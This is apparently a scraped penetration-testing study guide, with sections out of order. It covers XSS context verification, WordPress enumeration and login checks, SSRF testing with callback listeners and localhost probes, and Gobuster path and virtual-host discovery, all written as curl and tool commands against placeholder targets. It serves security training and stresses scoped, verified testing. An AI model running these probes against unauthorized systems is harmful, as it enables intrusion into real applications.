id="find-the-clue-from-your-starting-access-16">2.2.21.2.1 Find the clue from your starting access Where to investigate: Locate a normal reflected/stored input and inspect its final HTML/DOM context in the browser rather than treating raw reflection as execution. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: Payload reaches a browser execution sink; any useful privileged action additionally needs a victim context, same-origin access and a valid request state Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Verify execution in the intended origin/role and independently verify any claimed action; reflection alone is not execution. Failure/next check: Encoding, CSP, inert contexts or absent victim interaction can break the chain. Preserve browser execution separately from claimed account takeover. curl -skG --data-urlencode 'PARAM=UNIQUE_MARKER' http://TARGET:PORT/PATH Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Rendered context:
UNIQUE_MARKER
Alternate response: <script>...</script> Recognize this detail: The output context and escaping determine whether browser execution is plausible; the second form is escaped text. Still missing before method selection: Verify the actual browser sink/execution, victim origin/role, required interaction and useful authorized same-origin action. Outcome after checking Example and next decision Enabled after validation Browser execution and the specific privileged action are independently confirmed: choose the appropriate XSS chain. Ruled out in this context The value remains inert/escaped in the relevant sink: reject that payload/context. Inconclusive Source reflection without DOM execution evidence leaves the browser effect unknown. If you do not yet have this clue: start with Map functions, roles and normal requests manually .

title: 2.2.21.3 Prerequisites
text: id="3-prerequisites-16">2.2.21.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: Payload reaches a browser execution sink; any useful privileged action additionally needs a victim context, same-origin access and a valid request state. <h3

title: 2.2.21.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-16">2.2.21.4 Discover and verify prerequisites curl -skG --data-urlencode 'PARAM=UNIQUE_MARKER' http://TARGET:PORT/PATH <h3

title: 2.2.21.5 Why it works
text: id="5-why-it-works-16">2.2.21.5 Why it works Reflected, stored and DOM-based paths differ in delivery and sink. Browser JavaScript runs with the origin's access; HttpOnly blocks reading a cookie but does not automatically block authenticated same-origin requests. <h3

title: 2.2.21.6 Execute and choose variants
text: id="6-execute-and-choose-variants-16">2.2.21.6 Execute and choose variants First inject a unique text marker and inspect where it appears in raw HTML and the DOM. Then use a controlled proof appropriate to the context: Classify the path: reflected: victim must visit a crafted request; stored: payload persists and a relevant user later renders it; DOM-based: client-side code moves controlled data into an executable DOM sink. Decisive output: JavaScript executes under the expected application origin and viewer context. Reflection or HTML display alone is not XSS. Match the proof to the observed parser context rather than trying a random payload list: Observed insertion context Minimal lab proof candidate What failure means HTML element body

title: 2.2.21.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-16">2.2.21.7 Worked example — hypothetical Observation: a stored marker is rendered in an administrator-facing page. Test: establish the actual output context and harmless execution proof. Illustrative output: code executes in that browser origin. Interpretation: assess whether a specific privileged same-origin action is reachable. <h3

title: 2.2.21.8 Verify the result
text: id="8-verify-the-result-16">2.2.21.8 Verify the result Verify execution in the intended origin/role and independently verify any claimed action; reflection alone is not execution. <h3

text: id="2-recognition-clues-17">2.2.22.2 Recognition clues WordPress paths/components or an accepted application administrator credential. <h4

title: 2.2.22.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-17">2.2.22.2.1 Find the clue from your starting access Where to investigate: Confirm WordPress-specific routes/components and inspect the capabilities actually presented after an accepted application login. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: Exact component/version or a verified role; file-edit/plugin installation rights and runtime write/execution must be checked Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Verify application role and any produced execution identity; component names alone do not establish a vulnerable version. Failure/next check: Missing editor, insufficient role or read-only filesystem changes the branch. Use exact exploit prerequisite matching or credential reuse. curl -sk -i http://TARGET:PORT/wp-login.php Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Observed paths: /wp-login.php, /wp-content/plugins/COMPONENT/ Authenticated dashboard: USER_ROLE Recognize this detail: Product/component and role clues guide two different paths: exact component exploit matching or a permitted administrative feature. Still missing before method selection: Verify build/configuration for a CVE, or actual editor/plugin/file rights plus executable handling for a feature chain. Outcome after checking Example and next decision Enabled after validation The precise vulnerable feature or permitted file-consumer route is established: select that mechanism. Ruled out in this context The account lacks the relevant capability and files are read-only: discard the assumed dashboard-to-shell route. Inconclusive A product path without exact version/feature evidence is insufficient for a public exploit. If you do not yet have this clue: start with Map functions, roles and normal requests manually . <h3

title: 2.2.22.3 Prerequisites
text: id="3-prerequisites-17">2.2.22.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: Exact component/version or a verified role; file-edit/plugin installation rights and runtime write/execution must be checked. <h3

title: 2.2.22.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-17">2.2.22.4 Discover and verify prerequisites curl -sk -i http://TARGET:PORT/wp-login.php <h3

title: 2.2.22.5 Why it works
text: id="5-why-it-works-17">2.2.22.5 Why it works WordPress administrator, writable theme/plugin files and operating-system execution are separate facts. Multisite roles, disabled editors and filesystem ownership can remove a familiar route. <h3

title: 2.2.22.6 Execute and choose variants
text: id="6-execute-and-choose-variants-17">2.2.22.6 Execute and choose variants Recognition: WordPress-specific paths/assets, generator metadata, REST routes or wp-content . Prerequisite: correct scheme, host header and base path. Decisive output: core/plugin/theme identity or an authenticated capability that maps to a concrete prerequisite. curl -skI https://HOSTNAME/ curl -sk https://HOSTNAME/robots.txt curl -sk https://HOSTNAME/wp-json/ | head curl -sk https://HOSTNAME/wp-content/ curl -sk https://HOSTNAME/wp-login.php -o wp-login.html Inspect page source for /wp-content/plugins/NAME/ , /wp-content/themes/NAME/ , versioned assets and alternate base paths. A visible version is a candidate, not exploitability proof. <summary

title: 2.2.22.6.1 WPScan inventory
text: id="variant-2-2-22-6-1">2.2.22.6.1 WPScan inventory wpscan --url https://HOSTNAME/ --disable-tls-checks \ --enumerate vp,vt,u --plugins-detection mixed \ --output wpscan-HOSTNAME.txt WPScan can be useful for component/user candidates, but verify every useful result manually. Vulnerability-database details may require an API token; never place a token in published notes or command history. Validate one legitimately acquired credential and then enumerate the role/capabilities it actually grants. curl -sk -c wp.cookies -b wp.cookies \ --data-urlencode 'log=USER' \ --data-urlencode 'pwd=PASSWORD' \ --data-urlencode 'wp-submit=Log In' \ --data-urlencode 'redirect_to=https://HOSTNAME/wp-admin/' \ https://HOSTNAME/wp-login.php -D wp-login.headers curl -sk -b wp.cookies https://HOSTNAME/wp-admin/ -o wp-admin.html A redirect alone is inconclusive. Confirm an authenticated page marker and the actual role. Useful capabilities can include media upload, plugin/theme editing/installation, post editing or administrative account management; each requires separate server-side authorization and execution conditions. XML-RPC exposure is a feature clue, not automatically a vulnerability: curl -sk -X POST https://HOSTNAME/xmlrpc.php \ -H 'Content-Type: text/xml' \ --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' <h3

title: 2.2.22.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-17">2.2.22.7 Worked example — hypothetical Observation: a credential opens the dashboard. Test: inspect its real capabilities and whether the supported file/plugin feature is enabled. Illustrative output: the editor is disabled. Interpretation: investigate permitted components/data rather than assuming a theme shell. <h3

title: 2.2.22.8 Verify the result
text: id="8-verify-the-result-17">2.2.22.8 Verify the result Verify application role and any produced execution identity; component names alone do not establish a vulnerable version. <h3

title: 2.2.22.9 Failure and fallback
text: id="9-failure-and-fallback-17">2.2.22.9 Failure and fallback Missing editor, insufficient role or read-only filesystem changes the branch. Use exact exploit prerequisite matching or credential reuse. <h3

title: 2.2.22.10 Continue from the interpreted result
text: id="10-next-transitions-17">2.2.22.10 Continue from the interpreted result Observed result Check before proceeding Next numbered section A product/version clue, advisory or component-specific public PoC Exact vulnerable build/configuration, required access and endpoint behavior; reviewable source and a verifiable expected effect §4.1.5 — Match a public exploit to the actual component and configuration A PoC, injected command or remote client reports execution A functioning execution primitive and an observable output or controlled side effect §4.2.5 — Verify command execution, host and represented identity A password tied to a plausible user and service Correct local/domain/application identity, reachable compatible service, accepted authentication and account state §3.1.6 — Validate known passwords and context-specific reuse <h2

title: 2.2.23 Use server-side requests to inspect reachable internal behavior
text: id="use-server-side-requests-to-inspect-reachable-internal-behavior">2.2.23 Use server-side requests to inspect reachable internal behavior Blocks: 4. Operational procedure | Quick sheet <h3

title: 2.2.23.1 Purpose and result
text: id="1-purpose-and-result-18">2.2.23.1 Purpose and result A confirmed server-side request and a bounded internal read/request capability. <h3

title: 2.2.23.2 Recognition clues
text: id="2-recognition-clues-18">2.2.23.2 Recognition clues URL import, preview, webhook or fetch behavior. <h4

title: 2.2.23.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-18">2.2.23.2.1 Find the clue from your starting access Where to investigate: Browse legitimate import/preview/webhook functions and identify a request whose normal input is a server-fetched URL. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: The application server performs a controllable request; destination/protocol policy and its network position permit the selected resource Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Verify source/request evidence and the exact returned internal behavior; separate blind fetches from response-readable SSRF. Failure/next check: No callback may be DNS, URL validation, egress or application behavior. Test the first failed boundary and avoid indiscriminate destination guessing. curl -skG --data-urlencode 'url=http://LHOST:PORT/FETCH_CANARY' http://TARGET:PORT/FETCH_PATH Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Controlled receiver: GET /FETCH_CANARY Application response: fetched status/preview Recognize this detail: A correlated receiver event supports server-side fetching; it does not establish internal access or response-readable SSRF. Still missing before method selection: Separate client-side fetches, server source, destination/protocol restrictions and response visibility. Outcome after checking Example and next decision Enabled after validation A permitted controlled internal request and its bounded result are confirmed: use that specific server-request primitive. Ruled out in this context The browser fetches directly and the server never requests it: reject server-side request inference. Inconclusive No receiver event can mean URL validation, DNS or egress; identify the first failed boundary. If you do not yet have this clue: start with Map functions, roles and normal requests manually . <h3

title: 2.2.23.3 Prerequisites
text: id="3-prerequisites-18">2.2.23.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: The application server performs a controllable request; destination/protocol policy and its network position permit the selected resource. <h3

title: 2.2.23.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-18">2.2.23.4 Discover and verify prerequisites curl -skG --data-urlencode 'url=http://LHOST:PORT/SSRF_CANARY' http://TARGET:PORT/FETCH_PATH <h3

title: 2.2.23.5 Why it works
text: id="5-why-it-works-18">2.2.23.5 Why it works An external callback proves server-side fetching, not unrestricted internal access. Redirect handling, URL parsing and response visibility determine which follow-on requests are possible. <h3

title: 2.2.23.6 Execute and choose variants
text: id="6-execute-and-choose-variants-18">2.2.23.6 Execute and choose variants Recognition: URL import, webhook, image/PDF fetch, feed preview, link unfurling or callback validation. Prerequisite: a parameter that the server dereferences. Decisive output: a request observed at a controlled listener or a stable response difference tied to the destination. Listener: python3 -m http.server LPORT --bind 0.0.0.0 Hypothetical request replay: curl -sk 'https://HOSTNAME/fetch?url=http://LHOST:LPORT/ssrf-marker' Interpret the path explicitly: browser/client -> vulnerable application -> requested URL The application, not Kali, must resolve and reach the destination. A browser-side fetch, open redirect or reflected URL does not prove SSRF. <summary

title: 2.2.23.6.1 Internal destination and parser variations
text: id="variant-2-2-23-6-1">2.2.23.6.1 Internal destination and parser variations <h4

title: 2.2.23.6.2 Only after an external controlled callback proves server-side fetching
text: id="variant-2-2-23-6-2">2.2.23.6.2 Only after an external controlled callback proves server-side fetching # Only after an external controlled callback proves server-side fetching curl -sk 'https://HOSTNAME/fetch?url=http://127.0.0.1:PORT/' curl -sk 'https://HOSTNAME/fetch?url=http://localhost:PORT/' <h4

title: 2.2.23.6.3 Preserve encoding when the URL is nested in form data
text: id="variant-2-2-23-6-3">2.2.23.6.3 Preserve encoding when the URL is nested in form data # Preserve encoding when the URL is nested in form data curl -sk -X POST https://HOSTNAME/fetch \ --data-urlencode 'url=http://127.0.0.1:PORT/' Compare status, body marker, size and timing against a closed-port control. Internal HTTP content establishes reachability/read capability, not command execution. <h3

title: 2.2.23.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-18">2.2.23.7 Worked example — hypothetical Observation: the controlled listener receives a fetch. Test: compare a justified internal endpoint and an unreachable control. Illustrative output: only an internal HTTP response is reflected. Interpretation: map that application boundary without assuming a general network tunnel. <h3

title: 2.2.24 Sources and shared concepts
text: id="sources-and-shared-concepts">2.2.24 Sources and shared concepts Supplied PEN-200 Ch 8–10 pp231–300. Hexdump web modules ; OWASP WSTG . Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.

title: 2.1 Map useful web behavior
text: id="map-useful-web-behavior">2.1 Map useful web behavior Strategy map | Master Notes | Operational index | Cheatsheets Build the request and role map before selecting a weakness. Distinguish scheme, virtual host, route, method, parameter, object and identity; the same path can expose different behavior in another context. Speedrun blocks: 3. Documented methods: 6. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 2.1.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">2.1.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 2.1.1.1 Capture a real request before fuzzing
text: id="capture-a-real-request-before-fuzzing">2.1.1.1 Capture a real request before fuzzing Use the browser/proxy to capture the real method, host, cookie and input; curl is the replay baseline. curl -skD headers.txt -o body.html http://TARGET:PORT/ curl -skI https://TARGET:PORT/ If Redirect to a different hostname: Resolve and replay that hostname before testing paths. → Discover virtual hosts and hostname-selected applications . If A login, upload or object endpoint: Capture its normal authenticated request and available roles. → Map parameters, API methods, objects and writable properties . Otherwise: Every request reaches the wrong/default site: fix the host/scheme/session first. → Establish scheme, host, redirects and request state . <h3

title: 2.1.1.2 Discover paths with Gobuster or the documented ffuf variant
text: id="discover-paths-with-gobuster-or-the-documented-ffuf-variant">2.1.1.2 Discover paths with Gobuster or the documented ffuf variant First request a missing path to learn the false-positive body/status/length. Keep the correct host and session. gobuster dir -u http://TARGET:PORT/ -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-root.txt If A backup, config, source or repository path: Read its content; a 200 response alone does not establish an artifact. → Inspect source, backups, configuration and repository artifacts . If A new application function: Map its parameters and authorization boundary. → Map parameters, API methods, objects and writable properties . Otherwise: All candidates look identical: repair the response controls rather than collecting more false positives. → Discover directories and files with controlled response filtering . <h3

title: 2.1.1.3 Enumerate hostname-selected sites
text: id="enumerate-hostname-selected-sites">2.1.1.3 Enumerate hostname-selected sites Use this when DNS, certificates, redirects or page content suggest another hostname. gobuster vhost -u http://DOMAIN:PORT/ --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vhosts.txt If A host has a distinct response: Browse it with the correct Host header and repeat function/path mapping. → Map functions, roles and normal requests manually . Otherwise: No distinct host: return to real application functions and exposed scripts. → Map functions, roles and normal requests manually . <h2

title: 2.1.2 Discovery workflow
text: id="discovery-workflow">2.1.2 Discovery workflow Start with a reachable URL. A suspicious parameter, hidden administration path or accepted account is not assumed. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Record scheme, hostname, redirects and session state: Establish scheme, host, redirects and request state . Browse real functions and capture their requests; inspect source/scripts and exposed artifacts: Map functions, roles and normal requests manually ; Inspect source, backups, configuration and repository artifacts . Use missing-path/host controls before content or virtual-host discovery: Discover directories and files with controlled response filtering ; Discover virtual hosts and hostname-selected applications . Map methods, input locations, object ownership and roles before selecting a weakness: Map parameters, API methods, objects and writable properties . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 2.1.3 Method families
text: id="method-families">2.1.3 Method families Application identity and hosts: Establish scheme, host, redirects and request state , Discover virtual hosts and hostname-selected applications . Functions, artifacts and content: Map functions, roles and normal requests manually , Inspect source, backups, configuration and repository artifacts , Discover directories and files with controlled response filtering . Inputs, objects and APIs: Map parameters, API methods, objects and writable properties . <h2

title: 2.1.4 Choose a method
text: id="choose-a-method">2.1.4 Choose a method Method Recognition clue Required access Enabling conditions Resulting capability Establish scheme, host, redirects and request state An HTTP endpoint, redirect or hostname-dependent response A reachable HTTP application and recorded anonymous or authenticated request state Correct scheme/port and virtual host; saved cookies/headers for authenticated comparisons A reproducible application identity and baseline request Discover virtual hosts and hostname-selected applications DNS names, redirects, certificate names or a default virtual-host response A reachable HTTP application and recorded anonymous or authenticated request state A destination listener, relevant domain candidates and controlled Host/SNI routing Additional verified applications on the same address Map functions, roles and normal requests manually Forms, downloads, exports, account functions or role-specific interfaces A reachable HTTP application and recorded anonymous or authenticated request state A normal request baseline and the relevant account/role; authorized accounts for role comparisons An input/function/role map with concrete attack hypotheses Inspect source, backups, configuration and repository artifacts JavaScript endpoints, backup names, exposed configuration or Git metadata A reachable HTTP application and recorded anonymous or authenticated request state Readable application artifact or a complete recoverable repository; preserve the public-source scope Hidden functionality, version clues or typed credential artifacts Discover directories and files with controlled response filtering An application has unlinked paths, backups or administration endpoints A reachable HTTP application and recorded anonymous or authenticated request state Correct base URL/session and a measured nonexistent-path response; bounded relevant wordlist Verified candidate routes and files Map parameters, API methods, objects and writable properties An API/schema, numeric object IDs, hidden fields or different HTTP methods A reachable HTTP application and recorded anonymous or authenticated request state A valid request and explicit role/object ownership; exact input format and content type A parameter/object/method inventory and testable authorization or injection hypothesis <h2

title: 2.1.5 Establish scheme, host, redirects and request state
text: id="establish-scheme-host-redirects-and-request-state">2.1.5 Establish scheme, host, redirects and request state Blocks: 3. Operational procedure | Quick sheet <h3

title: 2.1.5.1 Purpose and result
text: id="1-purpose-and-result">2.1.5.1 Purpose and result A reproducible application identity and baseline request. <h3

title: 2.1.5.2 Recognition clues
text: id="2-recognition-clues">2.1.5.2 Recognition clues An HTTP endpoint, redirect or hostname-dependent response. <h4

title: 2.1.5.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access">2.1.5.2.1 Find the clue from your starting access Where to investigate: Request the assigned HTTP endpoint without following redirects blindly; inspect location, cookies and alternate scheme/hostname behavior. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reachable HTTP application and recorded anonymous or authenticated request state Requires: Correct scheme/port and virtual host; saved cookies/headers for authenticated comparisons Action class: HTTP requests; selected authenticated application actions can change application state. Stop/verify: Record final URL, host, status, redirects, cookies and authentication context before comparing payload results. Failure/next check: A redirect loop or generic default page may indicate a wrong host or missing session rather than a nonexistent application. curl -skD headers.txt -o body.html http://TARGET:PORT/ curl -skI https://TARGET:PORT/ Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. HTTP/1.1 302 Found Location: https://HOSTNAME/ Set-Cookie: SESSION_COOKIE Recognize this detail: The hostname/scheme redirect identifies the application request context to reproduce. Still missing before method selection: Confirm the hostname routes to the assigned address and preserve its TLS/Host/session state. Outcome after checking Example and next decision Enabled after validation The correct named request reaches a distinct application: map its functions. Ruled out in this context The candidate name produces only the default missing-host response: discard that virtual-host inference. Inconclusive Redirect loops can mean missing cookies/host routing; repair the normal request before testing vulnerabilities. If you do not yet have this clue: start with this topic's discovery workflow . <h3

title: 2.1.5.3 Prerequisites
text: id="3-prerequisites">2.1.5.3 Prerequisites Starting access: A reachable HTTP application and recorded anonymous or authenticated request state. Required conditions: Correct scheme/port and virtual host; saved cookies/headers for authenticated comparisons. <h3

title: 2.1.5.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites">2.1.5.4 Discover and verify prerequisites curl -skD headers.txt -o body.html http://TARGET:PORT/ curl -skI https://TARGET:PORT/ <h3

title: 2.1.5.5 Why it works
text: id="5-why-it-works">2.1.5.5 Why it works TLS SNI, Host, redirects and cookies can select different applications. A response from the IP URL does not describe every hostname served by that listener. <h3

title: 2.1.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">2.1.5.6 Execute and choose variants curl -skL -D headers.txt -o body.html http://TARGET:PORT/ curl -sk -o /dev/null -w 'code=%{http_code} bytes=%{size_download} type=%{content_type} redirect=%{redirect_url}\n' http://TARGET:PORT/ Decisive output: record the scheme, hostname/ Host header, port, redirects, page title, certificate names, server/framework clues and whether the view is anonymous or authenticated. <summary

title: 2.1.5.6.1 Variant — explicit virtual-host candidate
text: id="variant-2-1-5-6-1">2.1.5.6.1 Variant — explicit virtual-host candidate curl -sk -H 'Host: CANDIDATE.DOMAIN' http://TARGET:PORT/ Compare it with a random hostname. A different status alone is weak evidence; compare body, length, title and redirects. <summary

title: 2.1.5.6.2 Variant — preserve cookies and follow redirects
text: id="variant-2-1-5-6-2">2.1.5.6.2 Variant — preserve cookies and follow redirects curl -skL -c cookies.txt -b cookies.txt http://TARGET:PORT/PATH Use a separate cookie jar per identity. Do not mix anonymous, ordinary-user and administrator evidence. <summary

title: 2.1.5.6.3 Variant — replay through Burp Community
text: id="variant-2-1-5-6-3">2.1.5.6.3 Variant — replay through Burp Community curl -sk -x http://127.0.0.1:8080 http://TARGET:PORT/PATH Confirm the proxy listener is active on 127.0.0.1:8080 . Use -k only for the controlled lab because it disables destination-certificate verification. <h3

title: 2.1.5.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical">2.1.5.7 Worked example — hypothetical Observation: the IP URL redirects to a hostname. Test: send the correct Host/SNI while routing to the assigned address. Illustrative output: a distinct application login appears. Interpretation: map that application separately. <h3

text: id="8-verify-the-result">2.1.5.8 Verify the result Record final URL, host, status, redirects, cookies and authentication context before comparing payload results. <h3
